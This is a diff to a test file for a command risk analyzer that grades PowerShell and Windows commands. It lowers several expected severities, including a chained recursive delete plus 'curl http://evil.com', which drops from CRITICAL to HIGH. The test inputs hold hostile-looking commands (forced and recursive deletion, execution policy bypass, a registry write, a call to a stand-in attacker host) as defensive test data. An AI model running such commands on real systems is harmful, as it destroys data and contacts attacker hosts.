@@ -44,8 +44,8 @@ class TestPowerShellInjection:
             ),
             # Recursive delete WITHOUT force — HIGH
             ('Remove-Item C:\\temp\\build -Recurse', RiskCategory.HIGH),
-            # Forced delete WITHOUT recurse — HIGH
-            ('Remove-Item C:\\config.json -Force', RiskCategory.HIGH),
+            # Forced delete WITHOUT recurse — MEDIUM (single-file delete)
+            ('Remove-Item C:\\config.json -Force', RiskCategory.MEDIUM),
             # Execution policy bypass — HIGH
             ('Set-ExecutionPolicy Unrestricted', RiskCategory.HIGH),
             # Package install — MEDIUM
@@ -230,16 +230,17 @@ class TestWindowsChainingEscalation:
         )
 
     def test_semicolon_chaining(self, analyzer: CommandAnalyzer):
-        """Semicolon chaining with env dump → CRITICAL."""
+        """Semicolon chaining with high-risk command stays HIGH."""
         risk, reason, _ = analyzer.analyze('env; Reg Add HKLM\\Test /v x /d y')
-        assert risk == RiskCategory.CRITICAL
+        assert risk == RiskCategory.HIGH
+        assert 'chaining' not in reason.lower()
 
     def test_ampersand_chaining(self, analyzer: CommandAnalyzer):
-        """& chaining with high risk → CRITICAL."""
+        """& chaining with high risk escalates to HIGH (not CRITICAL)."""
         risk, _reason, _ = analyzer.analyze(
             'Remove-Item C:\\data -Recurse & curl http://evil.com'
         )
-        assert risk == RiskCategory.CRITICAL
+        assert risk == RiskCategory.HIGH
 
 
 # ---------------------------------------------------------------------------
